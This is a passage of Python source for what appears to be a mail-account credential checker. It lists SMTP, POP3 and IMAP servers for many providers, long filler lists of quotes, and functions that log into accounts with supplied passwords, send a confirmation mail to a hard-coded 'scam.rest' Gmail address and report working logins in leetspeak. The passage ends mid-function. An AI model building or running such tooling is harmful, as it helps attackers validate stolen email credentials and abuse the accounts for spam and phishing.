import dns.resolver
import smtplib
import poplib
import imaplib
import random
import sys
import time
from datetime import datetime
from queue import Queue
from threading import Thread
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from colorama import Fore, Style

banner = '╔═╦═╦╦═╦╦═╗╔═╦╦══╦══╦╦╗\n║╩║║║║║║║╩║║╚║╠╗╔╩╗╔╩╗║\n╚╩╩╩═╩╩═╩╩╝╚═╩╝╚╝ ╚╝ ╚╝'
ban = f'{banner}\n\n By : AnnaQitty'
SERVERS = {
    'smtp': {
        'office365': ('smtp.office365.com', [25, 465, 587, 2525, 26]),
        'googlemail': ('smtp.googlemail.com', [25, 465, 587, 2525, 26]),
        'yahoo': ('smtp.mail.yahoo.com', [25, 465, 587, 2525, 26]),
        'aol': ('smtp.aol.com', [25, 465, 587, 2525, 26]),
        'outlook': ('smtp.outlook.com', [25, 465, 587, 2525, 26]),
        'icloud': ('smtp.mail.me.com', [25, 465, 587, 2525, 26]),
        'mailru': ('smtp.mail.ru', [25, 465, 587, 2525, 26]),
        'zoho': ('smtp.zoho.com', [25, 465, 587, 2525, 26]),
        'gmx': ('smtp.gmx.com', [25, 465, 587, 2525, 26]),
        'inbox': ('smtp.inbox.com', [25, 465, 587, 2525, 26]),
        'mail': ('smtp.mail.com', [25, 465, 587, 2525, 26]),
        'fastmail': ('smtp.fastmail.com', [25, 465, 587, 2525, 26]),
        'tutanota': ('smtp.tutanota.com', [25, 465, 587, 2525, 26]),
        'protonmail': ('smtp.protonmail.com', [25, 465, 587, 2525, 26]),
        'lavabit': ('smtp.lavabit.com', [25, 465, 587, 2525, 26]),
        'runbox': ('smtp.runbox.com', [25, 465, 587, 2525, 26]),
        'yandex': ('smtp.yandex.com', [25, 465, 587, 2525, 26]),
        'mailjet': ('in-v3.mailjet.com', [25, 465, 587, 2525, 26]),
        'sendgrid': ('smtp.sendgrid.net', [25, 465, 587, 2525, 26]),
        'sendinblue': ('smtp-relay.sendinblue.com', [25, 465, 587, 2525, 26]),
        'mailchimp': ('smtp.mailchimp.com', [25, 465, 587, 2525, 26]),
        'office': ('smtp.office.com', [25, 465, 587, 2525, 26]),
        'hushmail': ('smtp.hushmail.com', [25, 465, 587, 2525, 26]),
        'qq': ('smtp.qq.com', [25, 465, 587, 2525, 26]),
        '163': ('smtp.163.com', 25),
        '126': ('smtp.126.com', 25),
        'aliyun': ('smtp.aliyun.com', 25),
        'sina': ('smtp.sina.com.cn', 25),
        'webmail': ('smtp.webmail.co.in', [25, 465, 587, 2525, 26]),
        'rediff': ('smtp.rediffmail.com', [25, 465, 587, 2525, 26]),
        'daum': ('smtp.daum.net', [25, 465, 587, 2525, 26]),
        'nate': ('smtp.nate.com', [25, 465, 587, 2525, 26]),
        # Japanese Providers
        'yahoojapan': ('smtp.mail.yahoo.co.jp', [25, 465, 587, 2525, 26]),
        'rakuten': ('smtp.rakuten.ne.jp', [25, 465, 587, 2525, 26]),
        'livedoor': ('smtp.livedoor.com', [25, 465, 587, 2525, 26]),
        'docomo': ('smtp.docomo.ne.jp', [25, 465, 587, 2525, 26]),
        'ezweb': ('smtp.ezweb.ne.jp', [25, 465, 587, 2525, 26]),
        'so-net': ('smtp.so-net.ne.jp', [25, 465, 587, 2525, 26]),
        # Indian Providers
        'rediff': ('smtp.rediffmail.com', [25, 465, 587, 2525, 26]),
        'bsnl': ('smtp.bsnl.in', [25, 465, 587, 2525, 26]),
        'airtel': ('smtp.airtel.in', [25, 465, 587, 2525, 26]),
        'mtmail': ('smtp.mtmail.in', [25, 465, 587, 2525, 26]),
        'dost': ('smtp.dost.in', [25, 465, 587, 2525, 26]),
        'sify': ('smtp.sify.com', [25, 465, 587, 2525, 26]),
        # German Providers
        'web': ('smtp.web.de', [25, 465, 587, 2525, 26]),
        'gmx': ('smtp.gmx.de', [25, 465, 587, 2525, 26]),
        't-online': ('smtp.t-online.de', [25, 465, 587, 2525, 26]),
        'arcor': ('smtp.arcor.de', [25, 465, 587, 2525, 26]),
        'freenet': ('smtp.freenet.de', [25, 465, 587, 2525, 26]),
        '1und1': ('smtp.1und1.de', [25, 465, 587, 2525, 26]),
        'mailbox': ('smtp.mailbox.org', [25, 465, 587, 2525, 26]),
        'posteo': ('smtp.posteo.de', [25, 465, 587, 2525, 26]),
        # UK Providers
        'hotmail': ('smtp.live.com', [25, 465, 587, 2525, 26]),  # Hotmail is now part of Outlook
        'uk': ('smtp.uk.com', [25, 465, 587, 2525, 26]),  # Generic UK SMTP
        'talktalk': ('smtp.talktalk.net', [25, 465, 587, 2525, 26]),
        'sky': ('smtp.sky.com', [25, 465, 587, 2525, 26]),
        'btinternet': ('smtp.btinternet.com', [25, 465, 587, 2525, 26]),
        'virginmedia': ('smtp.virginmedia.com', [25, 465, 587, 2525, 26]),
        'ntlworld': ('smtp.ntlworld.com', [25, 465, 587, 2525, 26]),
        'aoluk': ('smtp.aol.co.uk', [25, 465, 587, 2525, 26]),
        'mail': ('smtp.mail.co.uk', [25, 465, 587, 2525, 26]),
        'blueyonder': ('smtp.blueyonder.co.uk', [25, 465, 587, 2525, 26]),
        'orange': ('smtp.orange.net', [25, 465, 587, 2525, 26]),
        'yahoo': ('smtp.mail.yahoo.co.uk', [25, 465, 587, 2525, 26]),
    },
    'pop3': {
        'office365': ('outlook.office365.com', [995, 110]), 
        'googlemail': ('pop.googlemail.com', [995, 110]), 
        'yahoo': ('pop.mail.yahoo.com', [995, 110]), 
        'aol': ('pop.aol.com', [995, 110]), 
        'outlook': ('outlook.office365.com', [995, 110]), 
        'icloud': ('p04-imap.mail.me.com', [993, 143]), 
        'mailru': ('pop.mail.ru', [995, 110]), 
        'zoho': ('pop.zoho.com', [995, 110]), 
        'gmx': ('pop.gmx.com', [995, 110]), 
        'inbox': ('pop.inbox.com', [995, 110]), 
        'mail': ('pop.mail.com', [995, 110]), 
        'fastmail': ('pop.fastmail.com', [995, 110]), 
        'tutanota': ('pop.tutanota.com', [995, 110]), 
        'protonmail': ('pop.protonmail.com', [995, 110]), 
        'lavabit': ('pop.lavabit.com', [995, 110]), 
        'runbox': ('pop.runbox.com', [995, 110]), 
        'yandex': ('pop.yandex.com', [995, 110]), 
        'mailjet': ('pop.mailjet.com', [995, 110]), 
        'sendgrid': ('pop.sendgrid.com', [995, 110]), 
        'sendinblue': ('pop.sendinblue.com', [995, 110]), 
        'mailchimp': ('pop.mailchimp.com', [995, 110]), 
        'hushmail': ('pop.hushmail.com', [995, 110]), 
        # Japanese Providers
        'yahoojapan': ('pop.mail.yahoo.co.jp', [995, 110]), 
        'rakuten': ('pop.rakuten.ne.jp', [995, 110]), 
        'livedoor': ('pop.livedoor.com', [995, 110]), 
        'docomo': ('pop.docomo.ne.jp', [995, 110]), 
        'ezweb': ('pop.ezweb.ne.jp', [995, 110]), 
        'so-net': ('pop.so-net.ne.jp', [995, 110]), 
        # Indian Providers
        'rediff': ('pop.rediffmail.com', [995, 110]), 
        'bsnl': ('pop.bsnl.in', [995, 110]), 
        'airtel': ('pop.airtel.in', [995, 110]), 
        'mtmail': ('pop.mtmail.in', [995, 110]), 
        'dost': ('pop.dost.in', [995, 110]), 
        'sify': ('pop.sify.com', [995, 110]), 
        # German Providers
        'web': ('pop.web.de', [995, 110]), 
        'gmx': ('pop.gmx.de', [995, 110]), 
        't-online': ('pop.t-online.de', [995, 110]), 
        'arcor': ('pop.arcor.de', [995, 110]), 
        'freenet': ('pop.freenet.de', [995, 110]), 
        '1und1': ('pop.1und1.de', [995, 110]), 
        'mailbox': ('pop.mailbox.org', [995, 110]), 
        'posteo': ('pop.posteo.de', [995, 110]), 
        # UK Providers
        'hotmail': ('pop.live.com', [995, 110]),   # Hotmail POP3
        'uk': ('pop.uk.com', [995, 110]),   # Generic UK POP3
        'talktalk': ('pop.talktalk.net', [995, 110]), 
        'sky': ('pop.sky.com', [995, 110]), 
        'btinternet': ('pop.btinternet.com', [995, 110]), 
        'virginmedia': ('pop.virginmedia.com', [995, 110]), 
        'ntlworld': ('pop.ntlworld.com', [995, 110]), 
        'aoluk': ('pop.aol.co.uk', [995, 110]), 
        'mail': ('pop.mail.co.uk', [995, 110]), 
        'blueyonder': ('pop.blueyonder.co.uk', [995, 110]), 
        'orange': ('pop.orange.net', [995, 110]), 
        'yahoo': ('pop.mail.yahoo.co.uk', [995, 110]), 
    },
    'imap': {
        'office365': ('outlook.office365.com', [993, 143]), 
        'googlemail': ('imap.googlemail.com', [993, 143]), 
        'yahoo': ('imap.mail.yahoo.com', [993, 143]), 
        'aol': ('imap.aol.com', [993, 143]), 
        'outlook': ('outlook.office365.com', [993, 143]), 
        'icloud': ('imap.mail.me.com', [993, 143]), 
        'mailru': ('imap.mail.ru', [993, 143]), 
        'zoho': ('imap.zoho.com', [993, 143]), 
        'gmx': ('imap.gmx.com', [993, 143]), 
        'inbox': ('imap.inbox.com', [993, 143]), 
        'mail': ('imap.mail.com', [993, 143]), 
        'fastmail': ('imap.fastmail.com', [993, 143]), 
        'tutanota': ('imap.tutanota.com', [993, 143]), 
        'protonmail': ('imap.protonmail.com', [993, 143]), 
        'lavabit': ('imap.lavabit.com', [993, 143]), 
        'runbox': ('imap.runbox.com', [993, 143]), 
        'yandex': ('imap.yandex.com', [993, 143]), 
        'mailjet': ('imap.mailjet.com', [993, 143]), 
        'sendgrid': ('imap.sendgrid.com', [993, 143]), 
        'sendinblue': ('imap.sendinblue.com', [993, 143]), 
        'mailchimp': ('imap.mailchimp.com', [993, 143]), 
        'hushmail': ('imap.hushmail.com', [993, 143]), 
        # Japanese Providers
        'yahoojapan': ('imap.mail.yahoo.co.jp', [993, 143]), 
        'rakuten': ('imap.rakuten.ne.jp', [993, 143]), 
        'livedoor': ('imap.livedoor.com', [993, 143]), 
        'docomo': ('imap.docomo.ne.jp', [993, 143]), 
        'ezweb': ('imap.ezweb.ne.jp', [993, 143]), 
        'so-net': ('imap.so-net.ne.jp', [993, 143]), 
        # Indian Providers
        'rediff': ('imap.rediffmail.com', [993, 143]), 
        'bsnl': ('imap.bsnl.in', [993, 143]), 
        'airtel': ('imap.airtel.in', [993, 143]), 
        'mtmail': ('imap.mtmail.in', [993, 143]), 
        'dost': ('imap.dost.in', [993, 143]), 
        'sify': ('imap.sify.com', [993, 143]), 
        # German Providers
        'web': ('imap.web.de', [993, 143]), 
        'gmx': ('imap.gmx.de', [993, 143]), 
        't-online': ('imap.t-online.de', [993, 143]), 
        'arcor': ('imap.arcor.de', [993, 143]), 
        'freenet': ('imap.freenet.de', [993, 143]), 
        '1und1': ('imap.1und1.de', [993, 143]), 
        'mailbox': ('imap.mailbox.org', [993, 143]), 
        'posteo': ('imap.posteo.de', [993, 143]), 
        # UK Providers
        'hotmail': ('imap.live.com', [993, 143]),   # Hotmail IMAP
        'uk': ('imap.uk.com', [993, 143]),   # Generic UK IMAP
        'talktalk': ('imap.talktalk.net', [993, 143]), 
        'sky': ('imap.sky.com', [993, 143]), 
        'btinternet': ('imap.btinternet.com', [993, 143]), 
        'virginmedia': ('imap.virginmedia.com', [993, 143]), 
        'ntlworld': ('imap.ntlworld.com', [993, 143]), 
        'aoluk': ('imap.aol.co.uk', [993, 143]), 
        'mail': ('imap.mail.co.uk', [993, 143]), 
        'blueyonder': ('imap.blueyonder.co.uk', [993, 143]), 
        'orange': ('imap.orange.net', [993, 143]), 
        'yahoo': ('imap.mail.yahoo.co.uk', [993, 143]), 
    },
}
TEST_RECIPIENT = 'scam.rest@gmail.com'
quotes = {
    'Inspiration': [
        "The only way to do great work is to love what you do. - Steve Jobs",
        "Believe you can and you're halfway there. - Theodore Roosevelt",
        "The future belongs to those who believe in the beauty of their dreams. - Eleanor Roosevelt",
        "The only limit to our realization of tomorrow is our doubts of today. - Franklin D. Roosevelt",
        "You are never too old to set another goal or to dream a new dream. - C.S. Lewis",
        "Success is not final, failure is not fatal: It is the courage to continue that counts. - Winston Churchill",
        "It does not matter how slowly you go as long as you do not stop. - Confucius",
        "Act as if what you do makes a difference. It does. - William James",
        "In the end, we will remember not the words of our enemies, but the silence of our friends. - Martin Luther King Jr.",
        "What lies behind us and what lies before us are tiny matters compared to what lies within us. - Ralph Waldo Emerson",
        "Your time is limited, don't waste it living someone else's life. - Steve Jobs",
        "Everything you’ve ever wanted is on the other side of fear. - George Addair",
        "Opportunities don't happen. You create them. - Chris Grosser",
        "Dream it. Wish it. Do it. - Unknown",
        "Success doesn’t just find you. You have to go out and get it. - Unknown",
        "The harder you work for something, the greater you’ll feel when you achieve it. - Unknown",
        "Dream bigger. Do bigger. - Unknown",
        "Don’t stop when you’re tired. Stop when you’re done. - Unknown",
        "Wake up with determination. Go to bed with satisfaction. - Unknown",
        "The key to success is to focus on goals, not obstacles. - Unknown"
    ],
    'Love': [
        "To love and be loved is to feel the sun from both sides. - David Viscott",
        "Love is not about how much you say ‘I love you’, but how much you prove that it’s true. - Unknown",
        "In the end, we discover that to love and let go can be the same thing. - Jack Kornfield",
        "The best thing to hold onto in life is each other. - Audrey Hepburn",
        "Love does not dominate; it cultivates. - Johann Wolfgang von Goethe",
        "You know you’re in love when you can’t fall asleep because reality is finally better than your dreams. - Dr. Seuss",
        "Love is composed of a single soul inhabiting two bodies. - Aristotle",
        "The greatest thing you’ll ever learn is just to love and be loved in return. - Eden Ahbez",
        "To love or have loved, that is enough. Ask nothing further. - Victor Hugo",
        "Love is the only reality, and it is not a mere sentiment. It is the ultimate truth that lies at the heart of creation. - Rabindranath Tagore",
        "There is only one happiness in this life, to love and be loved. - George Sand",
        "Love is an endless act of forgiveness. - Martin Luther King Jr.",
        "To love and be loved is to feel the sun from both sides. - David Viscott",
        "Every heart sings a song, incomplete, until another heart whispers back. - Plato",
        "We are most alive when we’re in love. - John Updike",
        "Love isn’t something you find. Love is something that finds you. - Loretta Young",
        "A loving heart is the truest wisdom. - Charles Dickens",
        "Where there is love there is life. - Mahatma Gandhi",
        "The best thing to hold onto in life is each other. - Audrey Hepburn"
    ],
    'Life': [
        "Life is what happens when you’re busy making other plans. - John Lennon",
        "The purpose of life is not to be happy. It is to be useful, to be honorable, to be compassionate, to have it make some difference that you have lived and lived well. - Ralph Waldo Emerson",
        "Life isn’t about waiting for the storm to pass, it’s about learning how to dance in the rain. - Vivian Greene",
        "You only live once, but if you do it right, once is enough. - Mae West",
        "In the end, it's not the years in your life that count. It's the life in your years. - Abraham Lincoln",
        "Life is short, and it is up to you to make it sweet. - Sarah Louise Delany",
        "Life is either a daring adventure or nothing at all. - Helen Keller",
        "The unexamined life is not worth living. - Socrates",
        "Life is really simple, but we insist on making it complicated. - Confucius",
        "To live is the rarest thing in the world. Most people exist, that is all. - Oscar Wilde",
        "The only impossible journey is the one you never begin. - Tony Robbins",
        "Life isn’t about finding yourself. Life is about creating yourself. - George Bernard Shaw",
        "Life is 10% what happens to us and 90% how we react to it. - Charles R. Swindoll",
        "Good friends are like stars. You don’t always see them, but you know they’re always there. - Unknown",
        "The best way to predict the future is to invent it. - Alan Kay",
        "Life is too important to be taken seriously. - Oscar Wilde",
        "Your time is limited, so don’t waste it living someone else’s life. - Steve Jobs",
        "The greatest glory in living lies not in never falling, but in rising every time we fall. - Nelson Mandela",
        "Life is what we make it, always has been, always will be. - Grandma Moses",
        "Happiness is not something ready-made. It comes from your own actions. - Dalai Lama"
    ],
    'Wisdom': [
        "The only true wisdom is in knowing you know nothing. - Socrates",
        "Wisdom is not a product of schooling but of the lifelong attempt to acquire it. - Albert Einstein",
        "Knowledge speaks, but wisdom listens. - Jimi Hendrix",
        "Wisdom begins in wonder. - Socrates",
        "The wise man does at once what the fool does finally. - Niccolo Machiavelli",
        "The greatest wisdom is seeing through appearances. - Atisha",
        "It is not how old you are but how you are old. - Jules Renard",
        "The only real mistake is the one from which we learn nothing. - Henry Ford",
        "The wise man can learn more from a foolish question than the fool can learn from a wise answer. - Bruce Lee",
        "Wisdom is the reward you get for a lifetime of listening when you'd have preferred to talk. - Doug Larson",
        "To acquire knowledge, one must study; but to acquire wisdom, one must observe. - Marilyn vos Savant",
        "Wisdom is the power to put our time and our knowledge to the proper use. - Thomas J. Watson",
        "Wisdom is the daughter of experience. - Leonardo da Vinci",
        "The only real wisdom is knowing how to live. - Jean-Jacques Rousseau",
        "There is no wisdom without the courage to face the unknown. - Unknown",
        "Wisdom is knowing what to do next; skill is knowing how to do it; virtue is doing it. - David Starr Jordan",
        "The more you know, the more you realize you don't know. - Aristotle",
        "Wisdom is the ability to make sound judgments and decisions based on knowledge and experience. - Unknown",
        "Wisdom is not a product of age but of experience and learning. - Unknown"
    ],
    'Humor': [
        "I told my wife she was drawing her eyebrows too high. She looked surprised. - Unknown",
        "Why don’t scientists trust atoms? Because they make up everything. - Unknown",
        "I threw a boomerang and now live in constant fear. - Unknown",
        "Why did the scarecrow win an award? Because he was outstanding in his field. - Unknown",
        "I'm on a seafood diet. I see food and I eat it. - Unknown",
        "Why don’t programmers like nature? It has too many bugs. - Unknown",
        "I would avoid the sushi if I was you. It’s a little fishy. - Unknown",
        "Why don't skeletons fight each other? They don't have the guts. - Unknown",
        "What do you call cheese that isn't yours? Nacho cheese. - Unknown",
        "How does a penguin build its house? Igloos it together. - Unknown",
        "Why did the bicycle fall over? It was two-tired. - Unknown",
        "Why don't some couples go to the gym? Because some relationships don't work out. - Unknown",
        "What do you get when you cross a snowman and a vampire? Frostbite. - Unknown",
        "Why did the golfer bring two pairs of pants? In case he got a hole in one. - Unknown",
        "Why did the math book look sad? Because it had too many problems. - Unknown",
        "What do you call fake spaghetti? An impasta. - Unknown",
        "How does a snowman get around? By riding an 'icicle'. - Unknown",
        "Why did the tomato turn red? Because it saw the salad dressing. - Unknown",
        "What do you call an alligator in a vest? An investigator. - Unknown"
    ],

    'inspiration': [
        "The only way to do great work is to love what you do.",
        "Believe you can and you’re halfway there.",
        "Act as if what you do makes a difference. It does.",
        "Success is not the key to happiness. Happiness is the key to success.",
        "The best way to predict the future is to create it.",
        "You are never too old to set another goal or to dream a new dream.",
        "The only limit to our realization of tomorrow is our doubts of today.",
        "Do not wait to strike till the iron is hot, but make it hot by striking.",
        "Your time is limited, so don’t waste it living someone else’s life.",
        "Start where you are. Use what you have. Do what you can."
    ],
    'humor': [
        "I’m on a whiskey diet. I’ve lost three days already.",
        "I told my wife she was drawing her eyebrows too high. She looked surprised.",
        "Why don’t scientists trust atoms? Because they make up everything!",
        "I threw a boomerang and now I’m living in constant fear.",
        "Why don’t skeletons fight each other? They don’t have the guts.",
        "What do you call fake spaghetti? An impasta.",
        "Parallel lines have so much in common. It’s a shame they’ll never meet.",
        "Why don’t some couples go to the gym? Because some relationships don’t work out.",
        "I would avoid the sushi if I was you. It’s a little fishy.",
        "I used to play piano by ear, but now I use my hands."
    ],
    'life': [
        "Life is what happens when you’re busy making other plans.",
        "Get your facts first, then you can distort them as you please.",
        "You only live once, but if you do it right, once is enough.",
        "Life isn’t about finding yourself. Life is about creating yourself.",
        "In three words I can sum up everything I've learned about life: it goes on.",
        "The purpose of our lives is to be happy.",
        "Life is really simple, but we insist on making it complicated.",
        "Life is short, and it is up to you to make it sweet.",
        "Live in the sunshine, swim the sea, drink the wild air.",
        "To live is the rarest thing in the world. Most people exist, that is all."
    ],
    'friendship': [
        "A friend is someone who knows all about you and still loves you.",
        "Friendship is born at that moment when one person says to another, 'What! You too? I thought I was the only one.'",
        "True friends are never apart, maybe in distance but never in heart.",
        "A real friend is one who walks in when the rest of the world walks out.",
        "Friendship is the only cement that will ever hold the world together.",
        "A single rose can be my garden… a single friend, my world.",
        "Friends are the family we choose for ourselves.",
        "There is nothing on this earth more to be prized than true friendship.",
        "The only way to have a friend is to be one.",
        "Friendship is a sheltering tree."
    ],
    'love': [
        "Love is composed of a single soul inhabiting two bodies.",
        "I have waited for this opportunity for more than half a century, to repeat to you once again my vow of eternal fidelity and everlasting love.",
        "You are my sun, my moon, and all my stars.",
        "Love does not dominate; it cultivates.",
        "I am yours, don’t give myself back to me.",
        "The best thing to hold onto in life is each other.",
        "Love is not about how many days, months, or years you have been together. Love is about how much you love each other every single day.",
        "To love and be loved is to feel the sun from both sides.",
        "Love is not something you find. Love is something that finds you.",
        "Love is a friendship set to music."
    ],
    'success': [
        "Success is not the key to happiness. Happiness is the key to success.",
        "Success usually comes to those who are too busy to be looking for it.",
        "Don’t be afraid to give up the good to go for the great.",
        "Success is walking from failure to failure with no loss of enthusiasm.",
        "The only limit to our realization of tomorrow is our doubts of today.",
        "The road to success and the road to failure are almost exactly the same.",
        "Success is getting what you want. Happiness is wanting what you get.",
        "Success is not in what you have, but who you are.",
        "Success is to be measured not so much by the position that one has reached in life as by the obstacles which he has overcome.",
        "The secret of success is to do the common things uncommonly well."
    ],
    'wisdom': [
        "Wisdom is not a product of schooling but of the lifelong attempt to acquire it.",
        "The only true wisdom is in knowing you know nothing.",
        "The journey of a thousand miles begins with one step.",
        "In the end, we will remember not the words of our enemies, but the silence of our friends.",
        "To know yourself, you must sacrifice the illusion that you already do.",
        "Wisdom is the reward you get for a lifetime of listening when you’d have preferred to talk.",
        "The wise man does at once what the fool does finally.",
        "Knowledge speaks, but wisdom listens.",
        "Wisdom begins in wonder.",
        "The greatest wisdom is to know the limits of one's own mind."
    ],
    'motivation': [
        "Your limitation—it's only your imagination.",
        "Push yourself, because no one else is going to do it for you.",
        "Great things never come from comfort zones.",
        "Dream it. Wish it. Do it.",
        "Success doesn’t just find you. You have to go out and get it.",
        "The harder you work for something, the greater you’ll feel when you achieve it.",
        "Dream bigger. Do bigger.",
        "Don’t stop when you’re tired. Stop when you’re done.",
        "Wake up with determination. Go to bed with satisfaction.",
        "Dream it. Believe it. Build it."
    ],
    'courage': [
        "Courage is grace under pressure.",
        "It does not do to dwell on dreams and forget to live.",
        "To be yourself in a world that is constantly trying to make you something else is the greatest accomplishment.",
        "Fortune favors the brave.",
        "Courage is not the absence of fear, but the triumph over it.",
        "The only thing we have to fear is fear itself.",
        "The brave man is not he who does not feel afraid, but he who conquers that fear.",
        "Courage doesn’t always roar. Sometimes courage is the quiet voice at the end of the day saying, ‘I will try again tomorrow.’",
        "You gain strength, courage, and confidence by every experience in which you really stop to look fear in the face.",
        "Life shrinks or expands in proportion to one’s courage."
    ],
    'kindness': [
        "No act of kindness, no matter how small, is ever wasted.",
        "Kindness is a language which the deaf can hear and the blind can see.",
        "The best way to find yourself is to lose yourself in the service of others.",
        "Kindness is not an act. It is a lifestyle.",
        "A single act of kindness throws out roots in all directions, and the roots spring up and make new trees.",
        "Kindness is like a snowball. The more you give, the bigger it grows.",
        "The only way to have a friend is to be one.",
        "One kind word can change someone’s entire day.",
        "The heart that gives, gathers.",
        "Be the change that you wish to see in the world."
    ],
    'creativity': [
        "Creativity is intelligence having fun.",
        "Every artist was first an amateur.",
        "Creativity takes courage.",
        "The creative adult is the child who survived.",
        "To live a creative life, we must lose our fear of being wrong.",
        "Creativity is allowing yourself to make mistakes. Art is knowing which ones to keep.",
        "The chief enemy of creativity is good sense.",
        "Creativity is contagious. Pass it on.",
        "The best way to predict the future is to invent it.",
        "Creativity is not a talent. It is a way of operating."
    ],

    'ewe': {
        'es': [
            "La única forma de hacer un gran trabajo es amar lo que haces.",
            "Cree que puedes y ya estás a mitad de camino.",
            "Actúa como si lo que haces marca una diferencia. La marca.",
            "El éxito no es la clave de la felicidad. La felicidad es la clave del éxito.",
            "La mejor manera de predecir el futuro es crearlo.",
            "Nunca eres demasiado viejo para fijar otro objetivo o soñar un nuevo sueño.",
            "El único límite para nuestra realización del mañana son nuestras dudas de hoy.",
            "No esperes a que el hierro esté caliente para golpearlo, hazlo caliente golpeándolo.",
            "Tu tiempo es limitado, así que no lo desperdicies viviendo la vida de otra persona.",
            "Empieza donde estás. Usa lo que tienes. Haz lo que puedas."
        ],
        'fr': [
            "La seule façon de faire du bon travail est d’aimer ce que vous faites.",
            "Croyez que vous pouvez et vous êtes déjà à mi-chemin.",
            "Agissez comme si ce que vous faites faisait une différence. Cela en fait.",
            "Le succès n'est pas la clé du bonheur. Le bonheur est la clé du succès.",
            "La meilleure façon de prédire l'avenir est de le créer.",
            "Vous n'êtes jamais trop vieux pour fixer un nouvel objectif ou rêver un nouveau rêve.",
            "La seule limite à notre réalisation de demain est nos doutes d'aujourd'hui.",
            "Ne vous attendez pas à frapper jusqu'à ce que le fer soit chaud, mais rendez-le chaud en frappant.",
            "Votre temps est limité, alors ne le gaspillez pas à vivre la vie de quelqu'un d'autre.",
            "Commencez où vous êtes. Utilisez ce que vous avez. Faites ce que vous pouvez."
        ],
        'de': [
            "Der einzige Weg, großartige Arbeit zu leisten, besteht darin, das zu lieben, was man tut.",
            "Glaube, dass du es kannst, und du bist schon auf halbem Weg.",
            "Handle so, als ob das, was du tust, einen Unterschied macht. Tut es.",
            "Erfolg ist nicht der Schlüssel zum Glück. Glück ist der Schlüssel zum Erfolg.",
            "Der beste Weg, die Zukunft vorherzusagen, ist, sie zu erschaffen.",
            "Du bist nie zu alt, um ein weiteres Ziel zu setzen oder einen neuen Traum zu träumen.",
            "Das einzige Limit für die Verwirklichung von morgen sind unsere Zweifel von heute.",
            "Warte nicht, bis das Eisen heiß ist, um zu schlagen, sondern mache es heiß, indem du schlägst.",
            "Deine Zeit ist begrenzt, also verschwende sie nicht, indem du das Leben eines anderen lebst.",
            "Beginne, wo du bist. Nutze, was du hast. Tu, was du kannst."
        ],
        'it': [
            "L’unico modo per fare un ottimo lavoro è amare quello che fai.",
            "Credi di poterlo fare e sei già a metà strada.",
            "Agisci come se quello che fai facesse la differenza. Lo fa.",
            "Il successo non è la chiave della felicità. La felicità è la chiave del successo.",
            "Il miglior modo per prevedere il futuro è crearlo.",
            "Non sei mai troppo vecchio per fissare un altro obiettivo o sognare un nuovo sogno.",
            "L'unico limite alla nostra realizzazione di domani sono i nostri dubbi di oggi.",
            "Non aspettare di colpire finché il ferro non è caldo, ma rendilo caldo colpendolo.",
            "Il tuo tempo è limitato, quindi non sprecarlo vivendo la vita di qualcun altro.",
            "Inizia dove sei. Usa quello che hai. Fai quello che puoi."
        ],
        'pt': [
            "A única maneira de fazer um grande trabalho é amar o que você faz.",
            "Acredite que você pode e já está na metade do caminho.",
            "Aja como se o que você faz fizesse a diferença. Faz.",
            "O sucesso não é a chave para a felicidade. A felicidade é a chave para o sucesso.",
            "A melhor maneira de prever o futuro é criá-lo.",
            "Você nunca é velho demais para definir outro objetivo ou sonhar um novo sonho.",
            "O único limite para a nossa realização de amanhã são as nossas dúvidas de hoje.",
            "Não espere para bater até que o ferro esteja quente, mas torne-o quente batendo.",
            "Seu tempo é limitado, então não o desperdice vivendo a vida de outra pessoa.",
            "Comece onde você está. Use o que você tem. Faça o que você pode."
        ],
        'zh': [
            "做伟大工作的唯一方法是热爱你所做的事。",
            "相信你能做到，你就已经走了一半。",
            "像你所做的事情有影响一样行动。确实有。",
            "成功不是幸福的关键。幸福是成功的关键。",
            "预测未来的最好方法是创造它。",
            "你永远不会太老去设定另一个目标或梦想一个新梦想。",
            "我们实现明天的唯一限制是我们今天的怀疑。",
            "不要等到铁热了再打，而是通过打击让它变热。",
            "你的时间有限，所以不要浪费它过别人的生活。",
            "从你所在的地方开始。用你所拥有的。做你能做的。"
        ],
        'ja': [
            "素晴らしい仕事をする唯一の方法は、自分がやっていることを愛することです。",
            "自分ができると信じることができれば、もう半分は成功しています。",
            "自分の行動が違いを生むように振る舞いなさい。確かにそうです。",
            "成功は幸せの鍵ではありません。幸せが成功の鍵です。",
            "未来を予測する最良の方法は、自分で創り出すことです。",
            "新しい目標を設定したり、新しい夢を見たりするには決して遅すぎることはありません。",
            "明日の実現の唯一の制限は、今日の私たちの疑念です。",
            "鉄が熱くなるまで待つのではなく、打つことで熱くしましょう。",
            "あなたの時間は限られています。他の誰かの人生を生きることでそれを無駄にしないでください。",
            "自分がいる場所から始めなさい。持っているもので利用しなさい。できることをしてください。"
        ]

}}

red = "\033[1;31m"
green = "\033[1;32m"
yellow = "\033[1;33m"
orange = "\033[1;33m"
blue = "\033[1;34m"
black = "\033[1;30m"
defcol = "\033[0m"

def get_random_quote_from_all():
    all_quotes = [quote for quotes_list in quotes.values() for quote in quotes_list]
    if all_quotes:
        return random.choice(all_quotes)
    return "No quote available."

def find_mx_records(domain):
    try:
        mx_records = dns.resolver.resolve(domain, 'MX')
        mx_servers = [str(record.exchange) for record in mx_records]
        return mx_servers
    except Exception as e:
        print(f"Error retrieving MX records: {e}")
        return []

def find_a_records(domain):
    try:
        a_records = dns.resolver.resolve(domain, 'A')
        a_addresses = [str(record.address) for record in a_records]
        return a_addresses
    except Exception as e:
        print(f"Error retrieving A records: {e}")
        return []

def send_html_email(subject, html_content, from_email, password, to_email, smtp_server, smtp_port):
    msg = MIMEMultipart('alternative')
    msg['Subject'] = subject
    msg['From'] = from_email
    msg['To'] = to_email
    part = MIMEText(html_content, 'html')
    msg.attach(part)

    try:
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()
        server.login(from_email, password)
        server.sendmail(from_email, to_email, msg.as_string())
        server.quit()
        print(Fore.GREEN + f'53ND3D 3M41L T0 {to_email} with SMTP ===>>> {smtp_server} ' + Fore.CYAN + get_random_quote_from_all() + Style.RESET_ALL)
        return True
    except Exception as e:
        print(Fore.RED + f'3RR0RR 53ND M41L !!! Let celebrate it!!!! ' + Fore.CYAN + get_random_quote_from_all() + Style.RESET_ALL)
        return False

def check_pop3_server(server, port, username, password):
    try:
        pop_conn = poplib.POP3_SSL(server, port)
        pop_conn.user(username)
        pop_conn.pass_(password)
        pop_conn.quit()
        print(Fore.GREEN + f'P0P3 W0RK3D !!!! ===>>> {server} ' + Fore.CYAN + get_random_quote_from_all() + Style.RESET_ALL)
        return True
    except Exception as e:
